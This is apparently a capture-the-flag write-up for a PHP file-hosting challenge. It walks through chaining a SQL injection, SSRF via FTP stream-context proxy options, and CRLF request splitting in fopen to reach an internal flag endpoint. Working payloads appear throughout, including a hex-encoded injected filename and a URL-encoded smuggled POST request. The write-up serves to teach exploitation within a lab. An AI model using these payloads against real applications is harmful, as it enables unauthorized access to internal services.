#sqli #crlf #req-splitting #hrs #ssrf #sqlite
# m0le24 - ndayFilestorage
## Description
S3, min.io, uploadthing... Why do we have to complicate our platforms with all of these when we have some good old well-tested solutions?
## Overview
It's a file hosting website composed by 2 services:
- app
- ftp -> this service runs an ftp service and an http service that is used to create accounts
## Road to flag
The flag is returned by the webserver running in the 'ftp' service:
```js
app.post("/flag", (req, res) => {
  if (!!req.headers["x-get-flag"]) {
    res.send(process.env.FLAG || "ptm{REDACTED}");
  } else {
    req.send("nope");
  }
});
```
## Code review
1. SQLi
There's a SQLi in the `upload_file` function:
```php
$stmt = $database->prepare("INSERT INTO files (owner, filename, size) VALUES (:owner, '$filename', :size)");
```

2. SSRF
The ftp context is created like this:
```php
$opts = ['ftp' => $_SESSION['settings']];
$context = stream_context_create($opts);
```

`$_SESSION['settings']` can be controlled by the user by submitting a `POST` request to `/`:
```php
$data = json_decode($_POST['settings'], true);
if (!is_array($data)) {
	die;
}
$_SESSION['settings'] = $data;
```

I can set the [context options](https://www.php.net/manual/en/context.ftp.php) in order to forward all `read` file requests to the ftp service:
```
{"proxy":"ftp:3000"}
```

and when trying to download a file this request will be sent:
```
GET ftp://username:password@ftp/filename HTTP/1.1
Authorization: Basic Mjg0OTJhNTQzYTMwYzdjODoyOTU3ZjJlZTUzYWM3MGQ5
Host: ftp
Connection: close
```
But to get the flag I only have to make the request POST and add the `x-get-flag` header.

3. CRLF injection -> Request splitting -> SSRF
In the `upload_file` function, the filename is not sanitized, and it's inserted directly into the url:
```php
$ftp = @fopen("ftp://{$_SESSION['user']}:{$_SESSION['password']}@ftp/$filename", 'w', false, $context);
```

Testing locally I observed that fopen is vulnerable to CRLF injection:

By setting `$filename = 'flag%20HTTP%2f1.1%0d%0aHost%3a%20ftp%0d%0a%0d%0aPOST%20%2fflag%20HTTP%2f1.1%0d%0aX-Get-Flag%3a%201%0d%0aX%3a%20'`
this request is sent:
```
GET ftp://dcc24aaf6ff28e53:91ce935517f3c9ec@ftp/flag HTTP/1.1
Host: ftp

POST /flag HTTP/1.1
X-Get-Flag: 1
X:  HTTP/1.1
Authorization: Basic ZGNjMjRhYWY2ZmYyOGU1Mzo5MWNlOTM1NTE3ZjNjOWVj
Host: ftp
Connection: close
```

But the problem is that it's not possible to insert CRLF into filenames.
So i can't request `GET /?filename=CRLF_PAYLOAD` because it is not present in the DB:
```php
$filename = $_GET['filename'];

$stmt = $database->prepare('SELECT * FROM files WHERE owner = :owner AND filename = :filename');
$stmt->execute([
	'owner' => $_SESSION['user'],
	'filename' => $filename
]);
$file = $stmt->fetch();

if (!$file) {
	die('<script>window.close()</script>');
}
```
## Exploitation
1. Creating a file with this name:
`none',1),(:owner,cast(X'666c616720485454502f312e310d0a486f73743a206674700d0a0d0a504f5354202f666c616720485454502f312e310d0a582d4765742d466c61673a20310d0a583a20' as text),:size);--`
Exploits the sqli and inserts in the db a file that has as name the CRLF payload
2. Set the ftp settings to `{"proxy":"ftp:3000"}`
3. request `GET /?filename=flag%20HTTP%2f1.1%0d%0aHost%3a%20ftp%0d%0a%0d%0aPOST%20%2fflag%20HTTP%2f1.1%0d%0aX-Get-Flag%3a%201%0d%0aX%3a%20`

`ptm{php_why_d0_y0u_hav3_t0_b3_l1k3_th1s..._--_....}`